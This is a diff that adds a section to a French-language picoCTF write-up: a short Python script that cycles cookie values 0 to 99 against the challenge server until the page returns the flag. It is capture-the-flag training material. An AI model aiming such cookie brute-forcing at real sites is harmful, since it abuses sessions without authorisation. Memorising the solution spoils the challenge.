@@ -29,3 +29,38 @@ Ce qui donne après quelques itérations le résultat suivant:
 Avec n'importe quel éditeur de cookie, vous pouvez le modifier et une fois la page rechargée voir apparaitre la solution:
 
 ![flag](./IMG/flag.png)
+
+## 0x5 Résolution avec un script en python
+
+Comme expliqué , nous allons faire une boucle qui testera toutes les possibilité de cookie, pour ce faire, voici le code que j'ai écrit:
+
+```python
+#!/usr/bin/env python
+
+import pwn
+import requests
+import re
+
+regex = "picoCTF{.*?}"
+url = "http://mercury.picoctf.net:17781/check"
+s = requests.Session()
+boucle = True
+
+def Exploit():
+    while boucle:
+        for miaou in range (0,100):
+            pwn.info("Connecting to {}".format(url))
+            pwn.info("Testing with cookie name={}".format(str(miaou)))
+            cookies = {'name': str(miaou)}
+            req = s.get(url, cookies=cookies)
+            req = req.content
+            result = re.findall(regex, str(req))
+            flag = result
+            if result:
+                for f in flag:
+                    pwn.success("Flag is: {}".format(f))
+                    break
+                return
+Exploit()
+
+```
